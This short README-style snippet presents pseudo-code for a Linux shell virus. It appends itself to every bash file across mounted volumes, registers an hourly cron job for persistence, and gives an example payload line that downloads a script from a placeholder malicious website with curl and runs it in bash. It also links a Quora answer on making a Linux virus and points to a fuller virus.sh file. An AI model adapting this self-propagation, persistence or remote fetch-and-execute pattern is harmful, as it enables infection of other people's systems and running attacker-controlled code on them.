### Over simplified Psuedo-code
```
for $volume in '/volumes':
  for $bashFile in $volume:
    $bashFile.append(thisScript)
    
cronJob.add(thisScript, OneHour)

# Add malicious code below this
# example:
bash <(curl -s http://myMaliciouswebsite.com/notahackscript.sh)
```

https://www.quora.com/How-can-I-make-a-virus-from-Linux/answer/Aravind-Reddy-V

A more tedious psuedo-code in `virus.sh` file.
